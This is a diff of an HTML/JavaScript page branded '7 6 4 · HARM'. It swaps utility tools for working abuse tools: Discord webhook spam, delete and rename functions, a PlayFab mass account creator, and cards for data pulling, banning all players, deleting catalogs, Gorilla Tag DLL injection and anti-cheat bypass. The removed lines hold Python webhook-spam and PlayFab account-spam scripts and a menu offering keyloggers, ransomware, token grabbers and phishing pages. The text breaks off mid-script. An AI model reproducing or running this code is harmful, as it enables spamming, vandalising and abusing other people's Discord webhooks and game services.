@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>7 6 4 · HARM · TOOLS</title>
+    <title>7 6 4 · HARM · GTAG · PLAYFAB</title>
     <style>
-        /* ===== RESET & BASE ===== */
         * {
             margin: 0;
             padding: 0;
@@ -21,11 +20,10 @@
         }
 
         .container {
-            max-width: 1300px;
+            max-width: 1200px;
             margin: 0 auto;
         }
 
-        /* ===== HEADER ===== */
         .header {
             text-align: center;
             border-bottom: 2px solid #2a1a1a;
@@ -34,11 +32,10 @@
         }
 
         .header h1 {
-            font-size: 52px;
+            font-size: 48px;
             color: #cc5555;
             letter-spacing: 8px;
             font-weight: 900;
-            text-shadow: 0 0 30px rgba(200, 50, 50, 0.15);
         }
 
         .header h1 span {
@@ -52,10 +49,9 @@
             margin-top: 6px;
         }
 
-        /* ===== TOOLS GRID ===== */
         .tools-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(340px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(360px, 1fr));
             gap: 22px;
             margin-top: 20px;
         }
@@ -104,7 +100,6 @@
             font-size: 13px;
             border-radius: 6px;
             margin-bottom: 10px;
-            transition: border 0.2s;
         }
 
         .tool-card input:focus,
@@ -115,7 +110,7 @@
         }
 
         .tool-card textarea {
-            min-height: 70px;
+            min-height: 60px;
             resize: vertical;
         }
 
@@ -131,6 +126,8 @@
             border-radius: 6px;
             transition: all 0.2s;
             letter-spacing: 1px;
+            margin-right: 6px;
+            margin-bottom: 6px;
         }
 
         .tool-card button:hover {
@@ -178,22 +175,7 @@
         .tool-card .output .blue {
             color: #66aaff;
         }
-        .tool-card .output .bold {
-            font-weight: bold;
-        }
 
-        .tool-card .output::-webkit-scrollbar {
-            width: 4px;
-        }
-        .tool-card .output::-webkit-scrollbar-track {
-            background: #0a0808;
-        }
-        .tool-card .output::-webkit-scrollbar-thumb {
-            background: #2a1a1a;
-            border-radius: 2px;
-        }
-
-        /* ===== FOOTER ===== */
         .footer {
             text-align: center;
             margin-top: 45px;
@@ -208,7 +190,6 @@
             color: #553333;
         }
 
-        /* ===== RESPONSIVE ===== */
         @media (max-width: 700px) {
             .header h1 {
                 font-size: 32px;
@@ -227,158 +208,142 @@
 
     <div class="container">
 
-        <!-- HEADER -->
         <div class="header">
             <h1>☠ <span>7 6 4</span> · HARM ☠</h1>
-            <div class="sub">REAL TOOLS · CLEAR · POWERFUL · PRIVATE</div>
+            <div class="sub">GTAG · PLAYFAB · WEBHOOKS</div>
         </div>
 
-        <!-- TOOLS GRID -->
         <div class="tools-grid">
 
-            <!-- ===== 1. DISCORD WEBHOOK SPAMMER ===== -->
+            <!-- ===== WEBHOOK SPAMMER ===== -->
             <div class="tool-card">
                 <div class="title"><span class="icon">📨</span> WEBHOOK SPAMMER</div>
-                <div class="desc">Send multiple messages to a Discord webhook with custom content.</div>
-                <input type="text" id="webhookUrlSpam" placeholder="https://discord.com/api/webhooks/..." />
-                <input type="text" id="webhookMsgSpam" placeholder="Message to spam..." value="7 6 4 · HARM" />
-                <input type="number" id="webhookCount" value="10" min="1" max="100" />
-                <button onclick="spamWebhook()">▶ SPAM WEBHOOK</button>
-                <div class="output" id="spamOutput">Ready to spam...</div>
+                <div class="desc">Spam a Discord webhook with custom messages.</div>
+                <input type="text" id="whSpamUrl" placeholder="https://discord.com/api/webhooks/..." />
+                <input type="text" id="whSpamMsg" placeholder="Message..." value="7 6 4 · HARM" />
+                <input type="number" id="whSpamCount" value="10" min="1" max="100" />
+                <button onclick="spamWebhook()">▶ SPAM</button>
+                <div class="output" id="whSpamOut">Ready.</div>
             </div>
 
-            <!-- ===== 2. DISCORD WEBHOOK DELETER ===== -->
+            <!-- ===== WEBHOOK DELETER ===== -->
             <div class="tool-card">
                 <div class="title"><span class="icon">🗑️</span> WEBHOOK DELETER</div>
-                <div class="desc">Permanently delete a Discord webhook (irreversible).</div>
-                <input type="text" id="webhookUrlDelete" placeholder="https://discord.com/api/webhooks/..." />
-                <button class="danger" onclick="deleteWebhook()">▶ DELETE WEBHOOK</button>
-                <div class="output" id="deleteOutput">Enter a webhook URL to delete...</div>
+                <div class="desc">Permanently delete a Discord webhook.</div>
+                <input type="text" id="whDelUrl" placeholder="https://discord.com/api/webhooks/..." />
+                <button class="danger" onclick="deleteWebhook()">▶ DELETE</button>
+                <div class="output" id="whDelOut">Enter URL and click Delete.</div>
             </div>
 
-            <!-- ===== 3. DISCORD WEBHOOK RENAMER ===== -->
+            <!-- ===== WEBHOOK RENAMER ===== -->
             <div class="tool-card">
                 <div class="title"><span class="icon">✏️</span> WEBHOOK RENAMER</div>
-                <div class="desc">Rename a Discord webhook to something else.</div>
-                <input type="text" id="webhookUrlRename" placeholder="https://discord.com/api/webhooks/..." />
-                <input type="text" id="webhookNewName" placeholder="New webhook name..." value="7 6 4 HARM" />
-                <button onclick="renameWebhook()">▶ RENAME WEBHOOK</button>
-                <div class="output" id="renameOutput">Enter a webhook URL and new name...</div>
+                <div class="desc">Rename a Discord webhook.</div>
+                <input type="text" id="whRenUrl" placeholder="https://discord.com/api/webhooks/..." />
+                <input type="text" id="whRenName" placeholder="New name..." value="7 6 4 HARM" />
+                <button onclick="renameWebhook()">▶ RENAME</button>
+                <div class="output" id="whRenOut">Enter URL and new name.</div>
             </div>
 
-            <!-- ===== 4. PASSWORD GENERATOR ===== -->
+            <!-- ===== PLAYFAB SPAMMER ===== -->
             <div class="tool-card">
-                <div class="title"><span class="icon">🔐</span> PASSWORD GENERATOR</div>
-                <div class="desc">Generate cryptographically secure passwords.</div>
-                <input type="number" id="passLength" value="16" min="8" max="64" />
-                <button onclick="genPassword()">▶ GENERATE</button>
-                <div class="output" id="passOutput">Click to generate...</div>
+                <div class="title"><span class="icon">🎮</span> PLAYFAB SPAMMER</div>
+                <div class="desc">Create PlayFab accounts via CustomID.</div>
+                <input type="text" id="pfTitle" placeholder="Title ID (e.g. ABC123)" />
+                <input type="number" id="pfCount" value="10" min="1" max="100" />
+                <button onclick="playfabSpam()">▶ SPAM</button>
+                <div class="output" id="pfSpamOut">Enter Title ID and count.</div>
             </div>
 
-            <!-- ===== 5. FILE HASHER ===== -->
+            <!-- ===== PLAYFAB DATA PULLER ===== -->
             <div class="tool-card">
-                <div class="title"><span class="icon">📁</span> FILE HASHER</div>
-                <div class="desc">Calculate MD5, SHA-1, and SHA-256 hashes of any file.</div>
-                <input type="file" id="fileInput" />
-                <button onclick="hashFile()">▶ HASH FILE</button>
-                <div class="output" id="hashOutput">Select a file and click Hash...</div>
-            </div>
-
-            <!-- ===== 6. BASE64 ENCODER/DECODER ===== -->
-            <div class="tool-card">
-                <div class="title"><span class="icon">🔤</span> BASE64 TOOL</div>
-                <div class="desc">Encode or decode Base64 text.</div>
-                <textarea id="base64Input" placeholder="Text to encode or Base64 to decode..."></textarea>
-                <button onclick="base64Encode()">▶ ENCODE</button>
-                <button onclick="base64Decode()">▶ DECODE</button>
-                <div class="output" id="base64Output">Enter text and click Encode or Decode...</div>
-            </div>
-
-            <!-- ===== 7. URL ENCODER/DECODER ===== -->
-            <div class="tool-card">
-                <div class="title"><span class="icon">🔗</span> URL ENCODER/DECODER</div>
-                <div class="desc">Encode or decode URL strings.</div>
-                <textarea id="urlInput" placeholder="URL or text to encode/decode..."></textarea>
-                <button onclick="urlEncode()">▶ ENCODE</button>
-                <button onclick="urlDecode()">▶ DECODE</button>
-                <div class="output" id="urlOutput">Enter text and click Encode or Decode...</div>
-            </div>
-
-            <!-- ===== 8. HASH GENERATOR (MD5 / SHA) ===== -->
-            <div class="tool-card">
-                <div class="title"><span class="icon">🔑</span> HASH GENERATOR</div>
-                <div class="desc">Generate MD5, SHA-1, or SHA-256 hash of any text.</div>
-                <input type="text" id="hashInput" placeholder="Text to hash..." />
-                <select id="hashType">
-                    <option value="MD5">MD5</option>
-                    <option value="SHA-1">SHA-1</option>
-                    <option value="SHA-256" selected>SHA-256</option>
+                <div class="title"><span class="icon">📊</span> PLAYFAB DATA PULLER</div>
+                <div class="desc">Pull Title Data, Inventory, Catalog, and more.</div>
+                <input type="text" id="pfPullTitle" placeholder="Title ID" />
+                <input type="text" id="pfPullTicket" placeholder="Session Ticket" />
+                <select id="pfPullType">
+                    <option value="titledata">Title Data</option>
+                    <option value="inventory">User Inventory</option>
+                    <option value="catalog">Catalog Items</option>
+                    <option value="readonly">User Read-Only Data</option>
                 </select>
-                <button onclick="generateHash()">▶ GENERATE HASH</button>
-                <div class="output" id="hashGenOutput">Enter text and click Generate...</div>
+                <button onclick="playfabPull()">▶ PULL</button>
+                <div class="output" id="pfPullOut">Enter Title ID and Session Ticket.</div>
             </div>
 
-            <!-- ===== 9. RANDOM STRING GENERATOR ===== -->
+            <!-- ===== PLAYFAB BAN ALL ===== -->
             <div class="tool-card">
-                <div class="title"><span class="icon">🎲</span> RANDOM STRING</div>
-                <div class="desc">Generate random strings (useful for tokens, IDs, etc.).</div>
-                <input type="number" id="randomLength" value="32" min="4" max="256" />
-                <button onclick="genRandomString()">▶ GENERATE</button>
-                <div class="output" id="randomOutput">Click to generate...</div>
+                <div class="title"><span class="icon">⛔</span> PLAYFAB BAN ALL</div>
+                <div class="desc">Ban all players in a segment (requires Dev Key).</div>
+                <input type="text" id="pfBanTitle" placeholder="Title ID" />
+                <input type="text" id="pfBanKey" placeholder="Developer Secret Key" />
+                <input type="text" id="pfBanSegment" placeholder="Segment ID (optional)" value="all" />
+                <button class="danger" onclick="playfabBanAll()">▶ BAN ALL</button>
+                <div class="output" id="pfBanOut">Enter Title ID and Dev Key.</div>
             </div>
 
-            <!-- ===== 10. JWT DECODER ===== -->
+            <!-- ===== PLAYFAB UNBAN ALL ===== -->
             <div class="tool-card">
-                <div class="title"><span class="icon">🪪</span> JWT DECODER</div>
-                <div class="desc">Decode a JWT token (header + payload) without verification.</div>
-                <textarea id="jwtInput" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."></textarea>
-                <button onclick="decodeJWT()">▶ DECODE JWT</button>
-                <div class="output" id="jwtOutput">Paste a JWT and click Decode...</div>
+                <div class="title"><span class="icon">🔓</span> PLAYFAB UNBAN ALL</div>
+                <div class="desc">Unban all banned players.</div>
+                <input type="text" id="pfUnbanTitle" placeholder="Title ID" />
+                <input type="text" id="pfUnbanKey" placeholder="Developer Secret Key" />
+                <button onclick="playfabUnbanAll()">▶ UNBAN ALL</button>
+                <div class="output" id="pfUnbanOut">Enter Title ID and Dev Key.</div>
             </div>
 
-            <!-- ===== 11. CODE GENERATOR — HARM SCRIPTS ===== -->
-            <div class="tool-card" style="border-color:#3a2222;">
-                <div class="title"><span class="icon">⚡</span> CODE GENERATOR · HARM</div>
-                <div class="desc">Generate ready-to-use scripts for Discord, PlayFab, and more.</div>
-                <select id="codeType">
-                    <option value="discord_spam">Discord Webhook Spam (Python)</option>
-                    <option value="discord_delete">Discord Webhook Delete (Python)</option>
-                    <option value="playfab_spam">PlayFab Account Spammer (Python)</option>
-                    <option value="playfab_pull">PlayFab Data Puller (Python)</option>
-                    <option value="ip_logger">IP Logger HTML (PHP)</option>
-                    <option value="ddos">DDoS Script (Python · Scapy)</option>
-                    <option value="port_scanner">Port Scanner (Python)</option>
-                    <option value="keylogger">Keylogger (Python · pynput)</option>
-                    <option value="ransomware">Ransomware Simulator (Python)</option>
-                    <option value="discord_token">Discord Token Grabber (Python)</option>
-                    <option value="phishing">Phishing Page HTML</option>
-                </select>
-                <button onclick="generateCode()">▶ GENERATE CODE</button>
-                <div class="output" id="codeOutput">Select a code type and click Generate...</div>
-            </div>
-
-            <!-- ===== 12. CRYPTO KEY GENERATOR ===== -->
+            <!-- ===== PLAYFAB DELETE CATALOG ===== -->
             <div class="tool-card">
-                <div class="title"><span class="icon">🔑</span> CRYPTO KEY GEN</div>
-                <div class="desc">Generate AES-256, RSA, or random secure keys.</div>
-                <select id="keyType">
-                    <option value="aes">AES-256 Key (32 bytes)</option>
-                    <option value="random">Random Secure Key (64 bytes)</option>
-                    <option value="uuid">UUID v4</option>
-                    <option value="api_key">API Key (32 chars)</option>
-                </select>
-                <button onclick="genCryptoKey()">▶ GENERATE KEY</button>
-                <div class="output" id="keyOutput">Select a key type and click Generate...</div>
+                <div class="title"><span class="icon">🗑️</span> PLAYFAB DELETE CATALOG</div>
+                <div class="desc">Delete a catalog version (irreversible).</div>
+                <input type="text" id="pfDelCatTitle" placeholder="Title ID" />
+                <input type="text" id="pfDelCatKey" placeholder="Developer Secret Key" />
+                <input type="text" id="pfDelCatVersion" placeholder="Catalog Version" />
+                <button class="danger" onclick="playfabDeleteCatalog()">▶ DELETE CATALOG</button>
+                <div class="output" id="pfDelCatOut">Enter Title ID, Dev Key, and Catalog Version.</div>
+            </div>
+
+            <!-- ===== GTAG ASSET DUMPER ===== -->
+            <div class="tool-card">
+                <div class="title"><span class="icon">📦</span> GTAG ASSET DUMPER</div>
+                <div class="desc">Dump assets from Gorilla Tag .unity3d files.</div>
+                <input type="file" id="gTagFile" accept=".unity3d" />
+                <button onclick="gTagDump()">▶ DUMP ASSETS</button>
+                <div class="output" id="gTagDumpOut">Select a .unity3d file.</div>
+            </div>
+
+            <!-- ===== GTAG MOD MENU GENERATOR ===== -->
+            <div class="tool-card">
+                <div class="title"><span class="icon">⚡</span> GTAG MOD MENU GEN</div>
+                <div class="desc">Generate a basic Gorilla Tag mod menu C# script.</div>
+                <input type="text" id="gTagMenuName" placeholder="Mod Name..." value="7 6 4 Mod" />
+                <button onclick="gTagMenuGen()">▶ GENERATE</button>
+                <div class="output" id="gTagMenuOut">Enter mod name and click Generate.</div>
+            </div>
+
+            <!-- ===== GTAG DLL INJECTOR ===== -->
+            <div class="tool-card">
+                <div class="title"><span class="icon">💉</span> GTAG DLL INJECTOR</div>
+                <div class="desc">Generate a DLL injector script for Gorilla Tag.</div>
+                <button onclick="gTagInjectorGen()">▶ GENERATE INJECTOR</button>
+                <div class="output" id="gTagInjectOut">Click to generate.</div>
+            </div>
+
+            <!-- ===== GTAG BYPASS GENERATOR ===== -->
+            <div class="tool-card">
+                <div class="title"><span class="icon">🔓</span> GTAG BYPASS GEN</div>
+                <div class="desc">Generate an anti-cheat bypass script.</div>
+                <button onclick="gTagBypassGen()">▶ GENERATE BYPASS</button>
+                <div class="output" id="gTagBypassOut">Click to generate.</div>
             </div>
 
         </div>
 
-        <!-- FOOTER -->
         <div class="footer">
-            <span class="red">☠</span> 7 6 4 · HARM · REAL TOOLS <span class="red">☠</span>
+            <span class="red">☠</span> 7 6 4 · HARM · GTAG · PLAYFAB <span class="red">☠</span>
             <br />
             <span style="font-size:10px;color:#2a1a1a;letter-spacing:6px;">
-                ████ USE RESPONSIBLY · FOR EDUCATIONAL PURPOSES ONLY ████
+                ████ EDUCATIONAL PURPOSES ONLY ████
             </span>
         </div>
 
@@ -386,561 +351,567 @@
 
     <script>
         // ============================================================
-        // TOOL 1: WEBHOOK SPAMMER
+        // WEBHOOK TOOLS
         // ============================================================
+
         async function spamWebhook() {
-            const url = document.getElementById('webhookUrlSpam').value.trim();
-            const msg = document.getElementById('webhookMsgSpam').value.trim() || '7 6 4 · HARM';
-            const count = parseInt(document.getElementById('webhookCount').value) || 10;
-            const output = document.getElementById('spamOutput');
+            const url = document.getElementById('whSpamUrl').value.trim();
+            const msg = document.getElementById('whSpamMsg').value.trim() || '7 6 4 · HARM';
+            const count = parseInt(document.getElementById('whSpamCount').value) || 10;
+            const out = document.getElementById('whSpamOut');
 
             if (!url || !url.startsWith('https://discord.com/api/webhooks/')) {
-                output.innerHTML = '<span class="red">✗ Please enter a valid Discord webhook URL.</span>';
+                out.innerHTML = '<span class="red">✗ Invalid webhook URL.</span>';
                 return;
             }
 
-            output.innerHTML = `⏳ Spamming ${count} messages...`;
-
-            let success = 0;
-            let failed = 0;
+            out.innerHTML = `⏳ Sending ${count}...`;
+            let ok = 0,
+                fail = 0;
 
             for (let i = 0; i < count; i++) {
                 try {
-                    const res = await fetch(url, {
+                    const r = await fetch(url, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ content: `${msg} | ${i+1}/${count}` })
                     });
-                    if (res.status === 204 || res.status === 200) {
-                        success++;
-                    } else {
-                        failed++;
-                    }
-                } catch (e) {
-                    failed++;
-                }
-                // Small delay to avoid rate limiting
-                await new Promise(r => setTimeout(r, 100));
-                output.innerHTML = `⏳ Spamming... ${i+1}/${count} | ✅ ${success} | ❌ ${failed}`;
+                    if (r.status === 204 || r.status === 200) ok++;
+                    else fail++;
+                } catch { fail++; }
+                await new Promise(r => setTimeout(r, 80));
+                out.innerHTML = `⏳ ${i+1}/${count} | ✅ ${ok} | ❌ ${fail}`;
             }
-
-            output.innerHTML = `<span class="green">✓ SPAM COMPLETE</span>\n✅ Sent: ${success}\n❌ Failed: ${failed}`;
+            out.innerHTML = `<span class="green">✓ SPAM DONE</span>\nSent: ${ok}\nFailed: ${fail}`;
         }
 
-        // ============================================================
-        // TOOL 2: WEBHOOK DELETER
-        // ============================================================
         async function deleteWebhook() {
-            const url = document.getElementById('webhookUrlDelete').value.trim();
-            const output = document.getElementById('deleteOutput');
-
+            const url = document.getElementById('whDelUrl').value.trim();
+            const out = document.getElementById('whDelOut');
             if (!url || !url.startsWith('https://discord.com/api/webhooks/')) {
-                output.innerHTML = '<span class="red">✗ Please enter a valid Discord webhook URL.</span>';
+                out.innerHTML = '<span class="red">✗ Invalid URL.</span>';
                 return;
             }
-
-            output.innerHTML = '⏳ Deleting webhook...';
-
+            out.innerHTML = '⏳ Deleting...';
             try {
-                const res = await fetch(url, { method: 'DELETE' });
-                if (res.status === 204) {
-                    output.innerHTML = '<span class="green">✓ Webhook deleted successfully.</span>';
-                } else if (res.status === 404) {
-                    output.innerHTML = '<span class="red">✗ Webhook not found (already deleted or invalid).</span>';
-                } else {
-                    output.innerHTML = `<span class="red">✗ Failed. Status: ${res.status}</span>`;
-                }
-            } catch (e) {
-                output.innerHTML = `<span class="red">✗ Error: ${e.message}</span>`;
-            }
+                const r = await fetch(url, { method: 'DELETE' });
+                if (r.status === 204) out.innerHTML = '<span class="green">✓ Deleted.</span>';
+                else if (r.status === 404) out.innerHTML = '<span class="red">✗ Not found.</span>';
+                else out.innerHTML = `<span class="red">✗ Status: ${r.status}</span>`;
+            } catch (e) { out.innerHTML = `<span class="red">✗ Error: ${e.message}</span>`; }
         }
 
-        // ============================================================
-        // TOOL 3: WEBHOOK RENAMER
-        // ============================================================
         async function renameWebhook() {
-            const url = document.getElementById('webhookUrlRename').value.trim();
-            const name = document.getElementById('webhookNewName').value.trim() || '7 6 4 HARM';
-            const output = document.getElementById('renameOutput');
-
+            const url = document.getElementById('whRenUrl').value.trim();
+            const name = document.getElementById('whRenName').value.trim() || '7 6 4 HARM';
+            const out = document.getElementById('whRenOut');
             if (!url || !url.startsWith('https://discord.com/api/webhooks/')) {
-                output.innerHTML = '<span class="red">✗ Please enter a valid Discord webhook URL.</span>';
+                out.innerHTML = '<span class="red">✗ Invalid URL.</span>';
                 return;
             }
-
-            output.innerHTML = '⏳ Renaming webhook...';
-
+            out.innerHTML = '⏳ Renaming...';
             try {
-                const res = await fetch(url, {
+                const r = await fetch(url, {
                     method: 'PATCH',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ name: name })
+                    body: JSON.stringify({ name })
                 });
-                if (res.status === 200 || res.status === 204) {
-                    output.innerHTML = `<span class="green">✓ Webhook renamed to "${name}"</span>`;
-                } else if (res.status === 404) {
-                    output.innerHTML = '<span class="red">✗ Webhook not found.</span>';
-                } else {
-                    output.innerHTML = `<span class="red">✗ Failed. Status: ${res.status}</span>`;
-                }
-            } catch (e) {
-                output.innerHTML = `<span class="red">✗ Error: ${e.message}</span>`;
-            }
+                if (r.status === 200 || r.status === 204) out.innerHTML = `<span class="green">✓ Renamed to "${name}"</span>`;
+                else if (r.status === 404) out.innerHTML = '<span class="red">✗ Not found.</span>';
+                else out.innerHTML = `<span class="red">✗ Status: ${r.status}</span>`;
+            } catch (e) { out.innerHTML = `<span class="red">✗ Error: ${e.message}</span>`; }
         }
 
         // ============================================================
-        // TOOL 4: PASSWORD GENERATOR
+        // PLAYFAB TOOLS
         // ============================================================
-        function genPassword() {
-            const output = document.getElementById('passOutput');
-            const length = parseInt(document.getElementById('passLength').value) || 16;
-            if (length < 8 || length > 64) {
-                output.innerHTML = '<span class="red">✗ Length must be between 8 and 64.</span>';
+
+        async function playfabSpam() {
+            const title = document.getElementById('pfTitle').value.trim();
+            const count = parseInt(document.getElementById('pfCount').value) || 10;
+            const out = document.getElementById('pfSpamOut');
+
+            if (!title) { out.innerHTML = '<span class="red">✗ Enter a Title ID.</span>'; return; }
+
+            out.innerHTML = `⏳ Creating ${count} accounts...`;
+            let ok = 0,
+                fail = 0;
+
+            for (let i = 0; i < count; i++) {
+                const id = crypto.randomUUID().replace(/-/g, '').substring(0, 16);
+                try {
+                    const r = await fetch(`https://${title}.playfabapi.com/Client/LoginWithCustomID`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            TitleId: title,
+                            CustomId: id,
+                            CreateAccount: true
+                        })
+                    });
+                    if (r.status === 200) ok++;
+                    else fail++;
+                } catch { fail++; }
+                await new Promise(r => setTimeout(r, 100));
+                out.innerHTML = `⏳ ${i+1}/${count} | ✅ ${ok} | ❌ ${fail}`;
+            }
+            out.innerHTML = `<span class="green">✓ SPAM DONE</span>\nCreated: ${ok}\nFailed: ${fail}`;
+        }
+
+        async function playfabPull() {
+            const title = document.getElementById('pfPullTitle').value.trim();
+            const ticket = document.getElementById('pfPullTicket').value.trim();
+            const type = document.getElementById('pfPullType').value;
+            const out = document.getElementById('pfPullOut');
+
+            if (!title || !ticket) {
+                out.innerHTML = '<span class="red">✗ Enter Title ID and Session Ticket.</span>';
                 return;
             }
-            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
-            const array = new Uint32Array(length);
-            crypto.getRandomValues(array);
-            let password = '';
-            for (let i = 0; i < length; i++) {
-                password += chars[array[i] % chars.length];
-            }
-            const hasUpper = /[A-Z]/.test(password);
-            const hasLower = /[a-z]/.test(password);
-            const hasDigit = /\d/.test(password);
-            const hasSpecial = /[^A-Za-z0-9]/.test(password);
-            const strength = [hasUpper, hasLower, hasDigit, hasSpecial].filter(Boolean).length;
-            const strengthText = strength === 4 ? '✅ Strong' : strength === 3 ? '⚠️ Medium' : '❌ Weak';
 
-            output.innerHTML =
-                `<span class="green">✓ PASSWORD</span>\nPassword: <span class="yellow">${password}</span>\nLength: ${length} | Strength: ${strengthText}`;
-        }
-
-        // ============================================================
-        // TOOL 5: FILE HASHER
-        // ============================================================
-        async function hashFile() {
-            const input = document.getElementById('fileInput');
-            const output = document.getElementById('hashOutput');
-
-            if (!input.files || !input.files[0]) {
-                output.innerHTML = '<span class="red">✗ Please select a file.</span>';
-                return;
-            }
-
-            const file = input.files[0];
-            const buffer = await file.arrayBuffer();
-
-            async function md5(data) {
-                const hash = await crypto.subtle.digest('MD5', data);
-                return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
-            }
-
-            async function sha1(data) {
-                const hash = await crypto.subtle.digest('SHA-1', data);
-                return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
-            }
-
-            async function sha256(data) {
-                const hash = await crypto.subtle.digest('SHA-256', data);
-                return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
-            }
-
-            try {
-                const md5Hash = await md5(buffer);
-                const sha1Hash = await sha1(buffer);
-                const sha256Hash = await sha256(buffer);
-
-                output.innerHTML =
-                    `<span class="green">✓ FILE HASHES</span>\nFile: ${file.name} (${file.size} bytes)\nMD5: ${md5Hash}\nSHA-1: ${sha1Hash}\nSHA-256: ${sha256Hash}`;
-            } catch (e) {
-                output.innerHTML = `<span class="red">✗ Error: ${e.message}</span>`;
-            }
-        }
-
-        // ============================================================
-        // TOOL 6: BASE64 ENCODER/DECODER
-        // ============================================================
-        function base64Encode() {
-            const input = document.getElementById('base64Input').value;
-            const output = document.getElementById('base64Output');
-            if (!input) { output.innerHTML = '<span class="red">✗ Please enter text to encode.</span>'; return; }
-            try {
-                output.innerHTML = `<span class="green">✓ ENCODED</span>\n${btoa(unescape(encodeURIComponent(input)))}`;
-            } catch (e) {
-                output.innerHTML = `<span class="red">✗ Error: ${e.message}</span>`;
-            }
-        }
-
-        function base64Decode() {
-            const input = document.getElementById('base64Input').value;
-            const output = document.getElementById('base64Output');
-            if (!input) { output.innerHTML = '<span class="red">✗ Please enter Base64 to decode.</span>'; return; }
-            try {
-                output.innerHTML = `<span class="green">✓ DECODED</span>\n${decodeURIComponent(escape(atob(input)))}`;
-            } catch (e) {
-                output.innerHTML = `<span class="red">✗ Error: Invalid Base64</span>`;
-            }
-        }
-
-        // ============================================================
-        // TOOL 7: URL ENCODER/DECODER
-        // ============================================================
-        function urlEncode() {
-            const input = document.getElementById('urlInput').value;
-            const output = document.getElementById('urlOutput');
-            if (!input) { output.innerHTML = '<span class="red">✗ Please enter text to encode.</span>'; return; }
-            output.innerHTML = `<span class="green">✓ ENCODED</span>\n${encodeURIComponent(input)}`;
-        }
-
-        function urlDecode() {
-            const input = document.getElementById('urlInput').value;
-            const output = document.getElementById('urlOutput');
-            if (!input) { output.innerHTML = '<span class="red">✗ Please enter text to decode.</span>'; return; }
-            try {
-                output.innerHTML = `<span class="green">✓ DECODED</span>\n${decodeURIComponent(input)}`;
-            } catch (e) {
-                output.innerHTML = `<span class="red">✗ Error: Invalid URL encoding</span>`;
-            }
-        }
-
-        // ============================================================
-        // TOOL 8: HASH GENERATOR
-        // ============================================================
-        async function generateHash() {
-            const input = document.getElementById('hashInput').value;
-            const type = document.getElementById('hashType').value;
-            const output = document.getElementById('hashGenOutput');
-
-            if (!input) { output.innerHTML = '<span class="red">✗ Please enter text to hash.</span>'; return; }
-
-            try {
-                const encoder = new TextEncoder();
-                const data = encoder.encode(input);
-                const hash = await crypto.subtle.digest(type, data);
-                const hex = Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
-                output.innerHTML = `<span class="green">✓ ${type} HASH</span>\n${hex}`;
-            } catch (e) {
-                output.innerHTML = `<span class="red">✗ Error: ${e.message}</span>`;
-            }
-        }
-
-        // ============================================================
-        // TOOL 9: RANDOM STRING GENERATOR
-        // ============================================================
-        function genRandomString() {
-            const output = document.getElementById('randomOutput');
-            const length = parseInt(document.getElementById('randomLength').value) || 32;
-            if (length < 4 || length > 256) {
-                output.innerHTML = '<span class="red">✗ Length must be between 4 and 256.</span>';
-                return;
-            }
-            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            const array = new Uint32Array(length);
-            crypto.getRandomValues(array);
-            let result = '';
-            for (let i = 0; i < length; i++) {
-                result += chars[array[i] % chars.length];
-            }
-            output.innerHTML = `<span class="green">✓ RANDOM STRING</span>\n${result}`;
-        }
-
-        // ============================================================
-        // TOOL 10: JWT DECODER
-        // ============================================================
-        function decodeJWT() {
-            const input = document.getElementById('jwtInput').value.trim();
-            const output = document.getElementById('jwtOutput');
-
-            if (!input) { output.innerHTML = '<span class="red">✗ Please paste a JWT token.</span>'; return; }
-
-            try {
-                const parts = input.split('.');
-                if (parts.length !== 3) {
-                    output.innerHTML = '<span class="red">✗ Invalid JWT format (must have 3 parts).</span>';
-                    return;
-                }
-                const header = JSON.parse(atob(parts[0]));
-                const payload = JSON.parse(atob(parts[1]));
-                output.innerHTML =
-                    `<span class="green">✓ JWT DECODED</span>\nHEADER:\n${JSON.stringify(header, null, 2)}\n\nPAYLOAD:\n${JSON.stringify(payload, null, 2)}`;
-            } catch (e) {
-                output.innerHTML = `<span class="red">✗ Error: ${e.message}</span>`;
-            }
-        }
-
-        // ============================================================
-        // TOOL 11: CODE GENERATOR — HARM SCRIPTS
-        // ============================================================
-        function generateCode() {
-            const type = document.getElementById('codeType').value;
-            const output = document.getElementById('codeOutput');
-
-            const scripts = {
-
-                'discord_spam': `# Discord Webhook Spammer
-import requests
-import time
-
-webhook = "YOUR_WEBHOOK_URL"
-message = "7 6 4 · HARM"
-count = 50
-
-for i in range(count):
-    try:
-        r = requests.post(webhook, json={"content": f"{message} | {i+1}/{count}"})
-        if r.status_code in [200, 204]:
-            print(f"[+] Sent {i+1}/{count}")
-        else:
-            print(f"[-] Failed {i+1}/{count} ({r.status_code})")
-    except Exception as e:
-        print(f"[!] Error: {e}")
-    time.sleep(0.1)
-
-print("[+] Spam complete!")`,
-
-                'discord_delete': `# Discord Webhook Deleter
-import requests
-
-webhook = "YOUR_WEBHOOK_URL"
-
-r = requests.delete(webhook)
-if r.status_code == 204:
-    print("[+] Webhook deleted successfully!")
-else:
-    print(f"[-] Failed: {r.status_code}")`,
-
-                'playfab_spam': `# PlayFab Account Spammer
-import requests
-import uuid
-import time
-
-title_id = "YOUR_TITLE_ID"
-count = 10
-
-for i in range(count):
-    device_id = str(uuid.uuid4())
-    url = f"https://{title_id}.playfabapi.com/Client/LoginWithCustomID"
-    payload = {
-        "TitleId": title_id,
-        "CustomId": device_id,
-        "CreateAccount": True
-    }
-    try:
-        r = requests.post(url, json=payload)
-        if r.status_code == 200:
-            print(f"[+] Account {i+1}/{count} created: {device_id}")
-        else:
-            print(f"[-] Failed {i+1}/{count}: {r.status_code}")
-    except Exception as e:
-        print(f"[!] Error: {e}")
